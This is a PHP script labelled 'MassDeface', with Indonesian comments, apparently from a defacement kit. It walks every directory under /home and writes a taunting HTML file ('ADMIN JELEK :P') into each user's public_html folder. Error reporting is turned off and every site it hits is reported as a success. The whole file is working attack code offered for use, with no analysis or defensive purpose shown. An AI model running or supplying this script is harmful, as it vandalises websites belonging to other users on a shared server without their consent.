<?php
error_reporting(0);
/*
Coded by dk72
only (root)
*/
$path = "/home";//director yang akan di scan
$isi = "ADMIN JELEK :P";//isi dari file yang akan di buat
$jenenge = "y.htm";//nama yang akan di buat
$dir = scandir($path);//mencari list folder/file 
echo "MassDeface";//pemanis
foreach($dir as $dor){
$dur = "$path/$dor";
$guoblok = $dur.'/public_html/'.$jenenge; // path directory nya
 if ($dor === '.'){
	file_put_contents($guoblok, $isi);
 } elseif($dor === '..'){
 file_put_contents($guoblok, $isi);
   } else {
      if(is_dir($dur)){
       file_put_contents($guoblok, $isi);
	echo "BERHASIL: $guoblok\n";      
	}
     }
}
?>
